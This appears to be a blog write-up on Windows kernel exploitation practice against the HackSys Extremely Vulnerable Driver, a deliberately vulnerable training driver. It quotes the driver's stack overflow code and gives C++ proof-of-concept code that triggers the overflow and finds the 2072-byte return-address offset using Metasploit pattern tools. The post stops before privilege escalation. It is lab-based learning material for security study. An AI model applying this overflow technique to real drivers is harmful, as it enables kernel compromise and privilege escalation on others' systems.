# Introduction
{: .mt-4 .mb-0 }

This series will highlight my experience with the HackSys Extremely Vulnerable Driver (HEVD) as I delve into learning Windows kernel exploitaiton :tada: I intentionally left out the initial steps in getting started - loading & running the driver and setting up kernel debugging - as I have already wrote an article on it [here](https://0reome1ster.github.io/posts/Windows-Kernel-Debugging). For this and future WKE posts, feel free to checkout my [WKE repo](https://github.com/0reome1ster/WKE) to see full source as opposed to code snippets! I am following a guide, <https://mdanilor.github.io/posts/hevd-0/>, to help orient myself during this first exploit so check it out!

# The Initial Crash
{: .mt-4 .mb-0 }

### Vulnerable Code
{: data-toc-skip='' .mt-4 .mb-0 }

```cpp
    ULONG KernelBuffer[BUFFER_SIZE] = { 0 };

(...)

    ProbeForRead(UserBuffer, sizeof(KernelBuffer), (ULONG)__alignof(UCHAR));

    DbgPrint("[+] UserBuffer: 0x%p\n", UserBuffer);
    DbgPrint("[+] UserBuffer Size: 0x%zX\n", Size);
    DbgPrint("[+] KernelBuffer: 0x%p\n", &KernelBuffer);
    DbgPrint("[+] KernelBuffer Size: 0x%zX\n", sizeof(KernelBuffer));

(...)

    DbgPrint("[+] Triggering Buffer Overflow in Stack\n");

    //
    // Vulnerability Note: This is a vanilla Stack based Overflow vulnerability
    // because the developer is passing the user supplied size directly to
    // RtlCopyMemory()/memcpy() without validating if the size is greater or
    // equal to the size of KernelBuffer
    //

    RtlCopyMemory((PVOID)KernelBuffer, UserBuffer, Size);

(...)
```

The above comment succintly summarizes the vulnerability within `TriggerBufferOverflowStack` - the user-controlled size variable is passed to `RtlCopyMemory` (a Windows API equivalent of memcpy) without any size checks. This allows an attacker to write an arbitrary amount of data to the destination buffer `KernelBuffer`, enabling a stack buffer overflow.

> This is a stack BoF because `KernelBuffer` is allocated on the stack; it could be a heap BoF if it was allocated via APIs such as ExAllocatePool and ExAllocatePoolWithTag

### PoC Snippet
{: data-toc-skip='' .mt-4 .mb-0 }
```cpp
void StackOverflow(int pid)
{
	HANDLE driverHandle = GetHandle(DEVICE_NAME);
	int bufSize = 4096;
	DWORD bytesReturned = 0;

	LPVOID buf = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, bufSize);

	if (buf == NULL)
		return;

	memset(buf, 'A', bufSize);

	DeviceIoControl(driverHandle, HEVD_StackOverflow, buf, bufSize, NULL, 0, &bytesReturned, NULL);

	HeapFree(GetProcessHeap(), 0, buf);
}
```

### Triggering the BoF
{: data-toc-skip='' .mt-4 .mb-0 }

Running the exploit code, we can see we triggered a crash.

# Determining Offset
{: .mt-4 .mb-0 }

Since we know that it roughly takes 4096 (0x1000) bytes to trigger the BoF, we can use Metasploit Framework's `msf-pattern_create` tool to generate a unqiue paylod to quickly ascertain the offset.

![msf-pattern_create](/assets/WKE/StackOverflow/pattern_create.png)

```cpp
const char* pattern = "<truncated for brevity>";

void StackOverflow(int pid)
{
	HANDLE driverHandle = GetHandle(DEVICE_NAME);
	int bufSize = 4096;
	DWORD bytesReturned = 0;

	LPVOID buf = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, bufSize);

	if (buf == NULL)
		return;

	// memset(buf, 'A', bufSize);
	memcpy(buf, pattern, bufSize);

	DeviceIoControl(driverHandle, HEVD_StackOverflow, buf, bufSize, NULL, 0, &bytesReturned, NULL);

	HeapFree(GetProcessHeap(), 0, buf);
}
```

> I do recognize that I could've directly passed `pattern` through the ioctl call; however, I didn't feel like changing variable names back-and-forth.
{: .prompt-info}

I recompiled my exploit binary and re-ran it on the VM to obtain the payload offset to overwrite RIP with.

![Stack BoF for offset](/assets/WKE/StackOverflow/StackOverflow2.png)

We can ignore the first column, `Child-SP`, and solely focus on `RetAddr`. We can see that the address it's trying to return to looks like a sequence of ASCII - 0x43, 0x32, 0x27, etc. We can extract this and paste it into another Metasploit Framework tool called `msf-pattern_offset` (very convenient naming).

Now that we know the offset, 2072 bytes, we can ROP our way into an Elevation of Privilege (EoP)...
